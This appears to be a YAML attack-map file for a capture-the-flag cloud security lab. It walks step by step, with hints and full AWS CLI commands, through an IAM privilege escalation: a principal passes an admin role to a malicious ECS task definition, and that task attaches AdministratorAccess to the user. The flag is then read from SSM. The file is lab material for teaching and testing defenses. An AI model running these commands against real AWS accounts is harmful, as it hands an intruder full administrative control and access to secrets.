attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ecs-005-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the admin target role, along with
        ecs:RegisterTaskDefinition and ecs:StartTask permissions. This combination allows
        you to register a malicious ECS task definition using the admin role and execute
        it on the ECS cluster's EC2 container instances.

    - id: ecs-task-definition
      label: "ECS Task Definition"
      type: resource
      subType: ecs-task
      arn: "arn:aws:ecs:{region}:{account_id}:task-definition/pl-ecs-005-admin-escalation"
      description: >
        A malicious ECS task definition registered by the attacker. It specifies the
        admin target role as both the task role and the execution role, and includes a
        container command that attaches AdministratorAccess to the starting user. When
        started on an EC2 container instance, the task runs with the admin role's
        temporary credentials vended through the container's IMDS.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ecs-005-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com. When
        passed to the ECS task definition and executed on an EC2 container instance, the
        task receives temporary credentials for this role. The task then uses those
        credentials to attach AdministratorAccess directly to the starting user, completing
        the privilege escalation. Admin-equivalent permissions are then used to read the
        scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ecs-005-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: ecs-task-definition
      label: "iam:PassRole + ecs:RegisterTaskDefinition"
      description: >
        The starting user passes the admin target role to a new ECS task definition.
        The task definition contains a containerized AWS CLI command that will attach
        AdministratorAccess to the starting user when executed.
      hints:
        - "Look at your iam:PassRole permission -- which role are you allowed to pass, and what service does it trust?"
        - "Use ecs:ListClusters to discover what ECS clusters exist in the account, then look for container instances registered to those clusters."
        - "An ECS task definition lets you specify a task role and a container command. Think about what command, running with admin credentials, would give you persistent access."
        - "The container image does not need to be anything custom -- a stock AWS CLI image is sufficient for issuing IAM API calls."
        - "Register a task definition specifying the admin role as the task role and a container command that modifies your own IAM permissions."
        - "Browse to https://pathfinding.cloud/paths/ecs-005 for technique details."
      commands:
        - description: "Register a malicious ECS task definition using the admin role"
          command: >
            aws ecs register-task-definition
            --family pl-ecs-005-admin-escalation
            --network-mode bridge
            --requires-compatibilities EC2
            --task-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-005-to-admin-target-role
            --execution-role-arn arn:aws:iam::{account_id}:role/pl-prod-ecs-005-to-admin-target-role
            --container-definitions '[{"name":"escalation-container","image":"amazon/aws-cli:latest","essential":true,"memory":512,"cpu":256,"command":["iam","attach-user-policy","--user-name","pl-prod-ecs-005-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'

    - from: ecs-task-definition
      to: target-role
      label: "ecs:StartTask"
      description: >
        The starting user launches the malicious task definition on an EC2 container
        instance in the ECS cluster. The task executes with the admin role's temporary
        credentials and attaches AdministratorAccess to the starting user, completing
        the privilege escalation.
      hints:
        - "ecs:StartTask differs from ecs:RunTask -- it requires you to explicitly specify which container instance to target. Use ecs:ListContainerInstances to find one."
        - "Use ecs:ListContainerInstances against the cluster to retrieve the container instance ARN you need for the --container-instances argument."
        - "After starting the task, use ecs:DescribeTasks to poll the task's lastStatus. Wait for it to reach STOPPED with a container exit code of 0."
        - "After the task completes, allow ~15 seconds for IAM policy propagation before verifying the policy attachment."
        - "Verify success by checking iam:ListAttachedUserPolicies on your starting user -- AdministratorAccess should now appear."
      commands:
        - description: "List container instances in the cluster to find a target"
          command: "aws ecs list-container-instances --cluster pl-prod-ecs-005-cluster"
        - description: "Start the malicious task on the container instance"
          command: >
            aws ecs start-task
            --cluster pl-prod-ecs-005-cluster
            --task-definition pl-ecs-005-admin-escalation:1
            --container-instances <CONTAINER_INSTANCE_ARN>
        - description: "Poll task status until STOPPED"
          command: "aws ecs describe-tasks --cluster pl-prod-ecs-005-cluster --tasks <TASK_ARN> --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'"
        - description: "Verify AdministratorAccess was attached to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-ecs-005-to-admin-starting-user"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ecs-005-to-admin --query 'Parameter.Value' --output text"
